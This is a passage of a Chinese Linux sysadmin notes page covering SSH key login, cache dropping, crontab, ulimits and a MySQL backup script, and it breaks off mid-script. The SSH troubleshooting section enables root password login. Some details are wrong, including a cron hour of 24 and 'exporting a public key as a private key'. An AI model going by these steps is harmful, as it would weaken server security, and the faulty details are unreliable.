&#x2F;this&#x2F;path&#x2F;right&#x2F;here</span><br></pre></td></tr></table></figure><h2 id="列出tar-gz压缩包的文件"><a href="#列出tar-gz压缩包的文件" class="headerlink" title="列出tar.gz压缩包的文件"></a>列出tar.gz压缩包的文件</h2><p>命令: <code>tar tzf  test.tar.gz</code></p><h2 id="Linux密钥登录和用户名密码登录"><a href="#Linux密钥登录和用户名密码登录" class="headerlink" title="Linux密钥登录和用户名密码登录"></a>Linux密钥登录和用户名密码登录</h2><p>对于Linux服务器，默认以密码登陆，安全性比较差，很早前就有计划修改为使用密钥登陆，一直觉得比较麻烦搁置着，其实步骤并不难，只是当时没觉得安全问题有那么严重而已。如果你也是这么认为，那么可以尝试登陆Linux服务器，输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastb | less</span><br></pre></td></tr></table></figure><p>可以看到几乎每天都会有大量的尝试登陆存在。为了服务器安全，禁止密码登陆，使用密钥方式登陆还是必要的。这里我尽量简单的记录下我设置的过程。</p><p>配置方法</p><h3 id="1-产生公钥和私钥文件"><a href="#1-产生公钥和私钥文件" class="headerlink" title="1. 产生公钥和私钥文件"></a>1. 产生公钥和私钥文件</h3><ol><li>在服务器端使用如下命令产生公钥和私钥：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$  ssh-keygen</span><br><span class="line">Generating public&#x2F;private rsa key pair.</span><br><span class="line">Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_rsa): &lt;&#x3D;&#x3D; 按 Enter</span><br><span class="line">Created directory &#39;&#x2F;root&#x2F;.ssh&#39;.</span><br><span class="line">Enter passphrase (empty for no passphrase): &lt;&#x3D;&#x3D; 输入密钥锁码，或直接按 Enter 留空</span><br><span class="line">Enter same passphrase again: &lt;&#x3D;&#x3D; 再输入一遍密钥锁码</span><br><span class="line">Your identification has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa. &lt;&#x3D;&#x3D; 私钥</span><br><span class="line">Your public key has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub. &lt;&#x3D;&#x3D; 公钥</span><br><span class="line">The key fingerprint is:</span><br><span class="line">0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 当前 用户的家目录中生成了一个 <code>.ssh</code> 的隐藏目录，内含两个密钥文件。<code>id_rsa</code> 为私钥，<code>id_rsa.pub</code> 为公钥。</p><ul><li><p>关于此处操作对于阿里云服务器也可以直接在阿里云的“<strong>网络与安全</strong>”-&gt; “<strong>密钥对</strong>“中由阿里云生成。阿里云： <a href="https://developer.aliyun.com/article/666688" target="_blank" rel="noopener">https://developer.aliyun.com/article/666688</a></p></li><li><p>你也可以使用xshell或者puttygen工具等在你自己的机器上产生对应的公钥，然后把<strong>公钥导出为私钥</strong>。</p></li></ul><h3 id="2-在服务器上安装公钥"><a href="#2-在服务器上安装公钥" class="headerlink" title="2. 在服务器上安装公钥"></a>2. 在服务器上安装公钥</h3><p>登陆需要配置密钥登陆的服务器，将公钥内容填入~/.ssh/authorized_keys文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ~&#x2F;.ssh</span><br><span class="line">$ cat ~&#x2F;.ssh&#x2F;id_rsa.pub &gt;&gt; ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"># 或者如果是客户端自己产生的可以直接编辑</span><br><span class="line">$ nano ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：保存后，对<code>.ssh</code>目录和其中的<code>authorized_keys</code>公钥文件设置相应的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chown -R root:root ~&#x2F;.ssh</span><br><span class="line">chmod -R 700  ~&#x2F;.ssh</span><br><span class="line">chmod -R 644  ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-设置SSH，打开公钥登录功能"><a href="#3-设置SSH，打开公钥登录功能" class="headerlink" title="3. 设置SSH，打开公钥登录功能"></a>3. 设置SSH，打开公钥登录功能</h3><p>接着修改ssh配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><p>对以下内容去掉注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"># The default is to check both .ssh&#x2F;authorized_keys and .ssh&#x2F;authorized_keys2</span><br><span class="line"># but this is overridden so installations will only check .ssh&#x2F;authorized_keys</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys</span><br><span class="line"># 记得最后面加上这个，否则无法进行密码登录</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>保存后重启sshd服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h3 id="4-XShell等客户端将私钥下载到客户端，然后使用"><a href="#4-XShell等客户端将私钥下载到客户端，然后使用" class="headerlink" title="4. XShell等客户端将私钥下载到客户端，然后使用"></a>4. XShell等客户端将私钥下载到客户端，然后使用</h3><ul><li>如果是通过<code>ssh-keygen</code>在服务器产生的公钥和私钥,从服务器下载私钥文件： <code>/root/.ssh/id_rsa</code>， 然后在xshell中进行连接使用。</li><li>如果是自己的电脑上产生的公钥，需要将公钥导出为私钥被保存，然后登录时候使用该私钥。如下截图：<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200711175803-2020-07-11.png" alt="20200711175803-2020-07-11"></li></ul><h3 id="5-关闭原密码登陆方式-小心注意"><a href="#5-关闭原密码登陆方式-小心注意" class="headerlink" title="5. 关闭原密码登陆方式(小心注意)"></a>5. 关闭原密码登陆方式(小心注意)</h3><p>如果使用密钥登陆成功，可以继续修改ssh配置文件，关闭密码登陆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><p>设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure><p>保存后重启sshd服务的步骤同上，这样就完成了密钥登陆的配置。</p><h2 id="Linux中Cache内存占用过高解决办法"><a href="#Linux中Cache内存占用过高解决办法" class="headerlink" title="Linux中Cache内存占用过高解决办法"></a>Linux中Cache内存占用过高解决办法</h2><p>文章来源: <a href="https://blog.csdn.net/ailice001/article/details/80353924" target="_blank" rel="noopener">解决Linux buffer/cache内存占用过高的办法</a></p><ol><li>在Linux系统中，我们经常用free命令来查看系统内存的使用状态。定时清理内存,清理空闲内存,清理缓存</li><li>如何回收cache？</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 1 &gt; /proc/sys/vm/drop_caches&quot;   表示清除pagecache。</span><br><span class="line">sudo sh -c &quot;echo 2 &gt; /proc/sys/vm/drop_caches&quot;    表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。</span><br><span class="line">sudo sh -c &quot;echo 3 &gt; /proc/sys/vm/drop_caches&quot;   表示清除pagecache和slab分配器中的缓存对象。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以下是可以用于定时执行清理内存</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> crontab -e</span> </span><br><span class="line"></span><br><span class="line">*/15 * * * * /opt/clearMemory.sh &gt; /dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查看当前运行的进程的详细路径"><a href="#查看当前运行的进程的详细路径" class="headerlink" title="查看当前运行的进程的详细路径"></a>查看当前运行的进程的详细路径</h2><p>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -c</span><br></pre></td></tr></table></figure><h2 id="通过进程pid查看进程对应的路径或者文件-可执行文件"><a href="#通过进程pid查看进程对应的路径或者文件-可执行文件" class="headerlink" title="通过进程pid查看进程对应的路径或者文件,可执行文件"></a>通过进程pid查看进程对应的路径或者文件,可执行文件</h2><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls  -l &#x2F;proc&#x2F;pid</span><br><span class="line">例如：</span><br><span class="line">$ ls -ls &#x2F;proc&#x2F;1245</span><br></pre></td></tr></table></figure><h2 id="查看进程占用排序"><a href="#查看进程占用排序" class="headerlink" title="查看进程占用排序"></a>查看进程占用排序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -aux --sort=-pcpu|head -10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查看定时任务-crontab命令"><a href="#查看定时任务-crontab命令" class="headerlink" title="查看定时任务 crontab命令"></a>查看定时任务 crontab命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看定时任务</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> crontab -l</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编辑定时任务，删除或者注释定时任务</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> crontab -e</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编辑，针对的是root用户</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nano /etc/crontab</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止crontab，启动crontab任务</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl stop cron</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl restart cron</span></span><br></pre></td></tr></table></figure><p>创建<code>Crontab</code>定时任务<br>Usually, you should open your personal crontab file using <code>crontab -e</code> command, however if you are root user and decide to choose system wide crontab file, you need to edit the crontab file located in <code>/etc/crontab</code>.现在创建一个定时脚本每天夜里执行备份操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 立即生效</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo crontab -e</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 需要执行重启服务才能生效: sudo systemctl restart cron.service ,不推荐。语法不一样，可能导致不执行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/crontab</span></span><br></pre></td></tr></table></figure><p>我们知道定时任务可以写到/etc/crontab与crontab -e下面，但你知道两者的区别吗?</p><p>语法不同</p><p>/etc/crontab</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> For details see man 4 crontabs, 有五个占位符号, 参考: https://phoenixnap.com/kb/set-up-cron-job-linux</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of job definition:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  .------------- hour (0 ar- 23)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  |</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> *  *  *  *  * user-name  <span class="built_in">command</span> to be executed</span></span><br></pre></td></tr></table></figure><p> <br> <br>crontab -e</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*  *  *  *  *  command</span><br></pre></td></tr></table></figure><p>使用范围<br>修改<code>/etc/crontab</code>这种方法只有root用户能用，这种方法更加方便与直接直接给其他用户设置计划任务，而且还可以指定执行shell等等， <code>crontab -e</code>这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入/var/spool/cron/usename</p><p>所以推荐使用： <code>sudo crontab -e</code></p><p>按照提示添加最后一行定时脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Running Cron job Daily</span></span><br><span class="line">@daily /opt/backup/scripts/mysql_backup.sh &gt;&gt; /var/log/mysql/mysql-backup.log 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> Running Cron job at 2AM Daily</span></span><br><span class="line">0 2 * * * /opt/backup/scripts/mysql_backup.sh &gt;&gt; /var/log/mysql/mysql-backup.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Running Cron job at 12AM &amp; 12PM Daily</span></span><br><span class="line">0 12,24 * * * /opt/backup/scripts/mysql_backup.sh &gt;&gt; /var/log/mysql/mysql-backup.log 2&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>查看执行情况（crontab执行 日志）</li></ul><p>执行结果不论是否成功，都会在 <code>/var/spool/mail/mail</code>文件中有<code>crontab</code>执行日志的记录,另外可以自己指定日志目录，参考后面的命令参数。</p><h3 id="etc-crontab文件和crontab-e命令区别"><a href="#etc-crontab文件和crontab-e命令区别" class="headerlink" title="/etc/crontab文件和crontab -e命令区别"></a><code>/etc/crontab</code>文件和<code>crontab -e</code>命令区别</h3><ol><li>格式不同。</li><li>修改/etc/crontab这种方法只有root用户能用，而crontab -e这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入<code>/var/spool/cron/usename</code>。</li><li>不管用 <code>crontab -e</code> or 改 <code>/etc/crontab</code> 都不需要重新启动 crond 服务</li></ol><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>参考设置连接: <a href="https://www.cnblogs.com/yoyotl/p/8151409.html" target="_blank" rel="noopener">Debian 8 设置时区和时间配置</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tzselect</span><br></pre></td></tr></table></figure><h2 id="查看文件夹各个文件大小"><a href="#查看文件夹各个文件大小" class="headerlink" title="查看文件夹各个文件大小"></a>查看文件夹各个文件大小</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -sh *</span><br></pre></td></tr></table></figure><h2 id="查看linux的架构-32-bit-or-64-bit"><a href="#查看linux的架构-32-bit-or-64-bit" class="headerlink" title="查看linux的架构 32-bit or 64-bit"></a>查看linux的架构 32-bit or 64-bit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 32位还是64位</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下面命令显示CPU架构</span></span><br><span class="line">lscpu</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/cpuinfo</span> </span><br><span class="line">Processor       : ARMv7 Processor rev 10 (v7l)</span><br><span class="line">ARMv7 (and below) is 32-bit. ARMv8 introduces the 64-bit instruction set.</span><br><span class="line">If you want to see whether your system supports 64-bit binaries, check the kernel architecture:</span><br><span class="line"><span class="meta">$</span><span class="bash"> uname -m</span></span><br></pre></td></tr></table></figure><h2 id="查看本机打开的端口号"><a href="#查看本机打开的端口号" class="headerlink" title="查看本机打开的端口号"></a>查看本机打开的端口号</h2><p>默认情况下Linux的1024以下端口是只有root用户才有权限占用,我们的tomcat,apache, nginx等等程序如果想要用普通用户来占用80端口的话就会抛出 java.net.BindException: Permission denied的异常。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看指定的端口</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo lsof -i:port</span></span><br><span class="line"></span><br><span class="line">查看所有端口</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo netstat -aptn</span></span><br></pre></td></tr></table></figure><h2 id="创建链接"><a href="#创建链接" class="headerlink" title="创建链接"></a>创建链接</h2><p>在当前目录创建一个链接名称<code>python</code>,这个链接指向的位置是: <code>/usr/local/bin/python</code>,命令如下:<br>ln -s 源文件 目标目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/bin/python python</span><br></pre></td></tr></table></figure><h2 id="删除缓存的安装失败的包"><a href="#删除缓存的安装失败的包" class="headerlink" title="删除缓存的安装失败的包"></a>删除缓存的安装失败的包</h2><p>进入目录<code>/var/cache/apt/archives</code>,删除下面的所有.deb文件即可</p><h2 id="修改登录用户密码"><a href="#修改登录用户密码" class="headerlink" title="修改登录用户密码"></a>修改登录用户密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure><h2 id="ssh登录失败"><a href="#ssh登录失败" class="headerlink" title="ssh登录失败"></a>ssh登录失败</h2><ol><li>进入谷歌云实例面板</li><li>切换到root角色,命令: <code>sudo -i</code></li><li>修改SSH配置文件<code>/etc/ssh/sshd_config</code>为如下内容:</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Authentication:</span></span><br><span class="line">PermitRootLogin yes //默认为no，需要开启root用户访问改为yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to no to <span class="built_in">disable</span> tunnelled clear text passwords</span></span><br><span class="line">PasswordAuthentication yes //默认为no，改为yes开启密码登陆</span><br></pre></td></tr></table></figure><ol start="4"><li>给root用户设置密码 <code>passwd root</code></li><li>重启ssh服务:    <code>/etc/init.d/ssh restart</code></li><li>在xshell中，直接使用root账号密码登录。</li></ol><p>在客户端或者服务端进行如下ssh链接,查看ssh登录失败的log:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> ssh -vvv alterhu2020@host</span> </span><br></pre></td></tr></table></figure><p>On the server end, check the logs. <code>/var/log/auth.log</code> will give you a pretty good idea about what happens when you try to login, look for messages that contain sshd. There are a variety of reasons why authentication could be failing, ranging from simple (you aren’t using the right username) to more complicated (sshd is configured to use the wrong authentication system).</p><p>如果以上还不行,直接通过root登录.</p><h2 id="改变当前用户组"><a href="#改变当前用户组" class="headerlink" title="改变当前用户组"></a>改变当前用户组</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -g www-data alterhu2020   (需要重启机器生效)</span><br><span class="line">groups alterhu2020</span><br><span class="line">sudo nano /etc/sudoers</span><br></pre></td></tr></table></figure><h2 id="unzip命令中文文件名乱码"><a href="#unzip命令中文文件名乱码" class="headerlink" title="unzip命令中文文件名乱码"></a>unzip命令中文文件名乱码</h2><p>采用最新的unzip命令没有参数<code>-O</code>，网上提到的使用参数<code>-O</code>可以指定编码，所以这个访问不能使用。所以使用<code>unar</code>命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install unar</span><br><span class="line"></span><br><span class="line">unar -e gb18030 gb18030.zip</span><br></pre></td></tr></table></figure><h2 id="配置linux并发最大打开文件数"><a href="#配置linux并发最大打开文件数" class="headerlink" title="配置linux并发最大打开文件数"></a>配置linux并发最大打开文件数</h2><p>进行目录<code>/etc/profile</code>添加如下配置信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> node环境变量</span></span><br><span class="line">export PATH=/opt/node/node-v12.14.1-linux-armv7l/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> java环境变量</span></span><br><span class="line">export JAVA_HOME=/opt/jdk/jdk1.8.0_241</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置pipenv</span></span><br><span class="line">export PATH=$HOME/.local/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置最大文件数,mysql和websock最大连接数</span></span><br><span class="line">ulimit -u 1048576</span><br><span class="line">ulimit -n 1048576</span><br><span class="line">ulimit -d unlimited</span><br><span class="line">ulimit -m unlimited</span><br><span class="line">ulimit -s unlimited</span><br><span class="line">ulimit -t unlimited</span><br><span class="line">ulimit -v unlimited</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上的配置如果用非root用户双概述可能会出现错误: <code>-bash: ulimit: max user processes: cannot modify limit:</code>. 需要修改对应配置文件: <code>/etc/security/limits.conf</code>, 在文件末尾增加如下配置信息(* 代表的是任意用户,比如root/pi),命令如下:<code>$ sudo nano /etc/security/limits.conf</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* soft noproc 1048576</span><br><span class="line">* hard noproc 1048576</span><br><span class="line">* soft nofile 1048576</span><br><span class="line">* hard nofile 1048576</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="定时备份mysql数据库，保存7天记录脚本"><a href="#定时备份mysql数据库，保存7天记录脚本" class="headerlink" title="定时备份mysql数据库，保存7天记录脚本"></a>定时备份mysql数据库，保存7天记录脚本</h2><p> 脚本参考来源:</p><ul><li><p><a href="https://gist.github.com/tleish/1c6e788c84f59200446b" target="_blank" rel="noopener">mysql定时备份脚本(推荐)</a></p></li><li><p><a href="https://graspingtech.com/schedule-backup-mysql-databases-ubuntu-16-04/" target="_blank" rel="noopener">mysql备份脚本</a></p></li><li><p>mysql备份脚本：</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TITLE:            mysql_backup.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DESCRIPTION:      script <span class="keyword">for</span> automating the daily mysql backups on development computer</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AUTHOR:           tleish</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DATE:             2013-12-20</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VERSION:          0.4</span></span><br><span class="line"><span class="meta">#</span><span class="bash">USAGE:            ./mysql_backup.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">CRON:</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> example cron <span class="keyword">for</span> daily db backup @ 9:15 am</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> min  hr mday month wday <span class="built_in">command</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> 15   9  *    *     *    /opt/backup/scripts/mysql_backup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">RESTORE FROM BACKUP</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">$ gunzip &lt; [backupfile.sql.gz] | mysql -u [uname] -p[pass] [dbname]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CUSTOM SETTINGS</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory to put the backup files</span></span><br><span class="line">BACKUP_DIR=/opt/backup</span><br><span class="line"></span><br><span class="line"><span 